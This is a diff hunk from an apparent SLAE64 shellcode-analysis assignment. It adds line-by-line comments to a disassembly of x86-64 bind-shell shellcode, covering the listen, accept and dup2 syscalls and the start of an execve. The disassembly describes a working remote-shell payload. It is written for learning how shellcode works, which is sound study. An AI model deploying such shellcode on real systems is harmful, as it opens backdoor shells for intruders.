@@ -168,21 +168,21 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 0000001C  6A31              push byte +0x31                   ; Pushes syscall value 49 (value of the bind syscall) into the stack.  
 0000001E  58                pop rax                           ; Pops this value into RAX.
 0000001F  0F05              syscall                           ; Executes the syscall.
-00000021  6A32              push byte +0x32
-00000023  58                pop rax
-00000024  0F05              syscall
-00000026  4831F6            xor rsi,rsi
-00000029  6A2B              push byte +0x2b
-0000002B  58                pop rax
-0000002C  0F05              syscall
-0000002E  4897              xchg rax,rdi
-00000030  6A03              push byte +0x3
-00000032  5E                pop rsi
-00000033  48FFCE            dec rsi
-00000036  6A21              push byte +0x21
-00000038  58                pop rax
-00000039  0F05              syscall
-0000003B  75F6              jnz 0x33
+00000021  6A32              push byte +0x32                   ; Pushes syscall value 50 (value of the listen syscall) into the stack.  
+00000023  58                pop rax                           ; Pops this value into RAX.
+00000024  0F05              syscall                           ; Executes the syscall.
+00000026  4831F6            xor rsi,rsi                       ; Zeroes out RSI.
+00000029  6A2B              push byte +0x2b                   ; Pushes syscall value 43 (value of the accept syscall) into the stack.  
+0000002B  58                pop rax                           ; Pops this value into RAX.
+0000002C  0F05              syscall                           ; Executes the syscall.
+0000002E  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
+00000030  6A03              push byte +0x3                    ; Pushes value 3 into the stack.
+00000032  5E                pop rsi                           ; Pops this value into RSI.
+00000033  48FFCE            dec rsi                           ; Decrements RSI
+00000036  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the dup2 syscall) into the stack.  
+00000038  58                pop rax                           ; Pops this value into RAX.
+00000039  0F05              syscall                           ; Executes the syscall.
+0000003B  75F6              jnz 0x33                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi instruction), the loop will not stop.
 0000003D  6A3B              push byte +0x3b
 0000003F  58                pop rax
 00000040  99                cdq
